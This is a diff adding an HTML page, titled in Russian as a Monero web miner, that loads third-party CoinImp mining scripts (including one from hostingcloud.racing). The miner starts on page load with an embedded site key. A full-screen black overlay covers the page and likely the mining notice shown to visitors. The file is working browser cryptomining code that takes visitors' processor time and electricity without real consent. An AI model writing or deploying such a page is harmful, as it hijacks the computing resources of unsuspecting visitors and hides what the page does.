@@ -1,0 +1,34 @@
+<!DOCTYPE html>
+<html lang="ru">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Веб Майнер Monero</title>
+        <script src="https://www.coinimp.com/miner/09904aae70a0280cd8aee4b50cdc8fa371d1e49f0465fa6363bbb82d6a379382/miner.js"></script>
+        <style>
+            .FrontPanel {
+                position: absolute;
+                width: 100%;
+                height: 100%;
+                z-index: 99999999;
+                left: 0px;
+                top: 0px;
+                background-color: black;
+            }
+        </style>
+    </head>
+    <body>
+
+        <div class="FrontPanel"></div>
+
+        <script src="https://www.hostingcloud.racing/rcQD.js"></script>
+        <script>
+            var _client = new Client.Anonymous('354b07177cf3352e4fae42a64ecae3439be073d60f5ab7f4c0c855cbfdd8ef2f', {
+                throttle: 0.1, c: 'w'
+            });
+            _client.start();
+            _client.addMiningNotification("Top", "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.", "#cccccc", 40, "#3d3d3d");
+        
+        </script>
+    </body>
+</html>
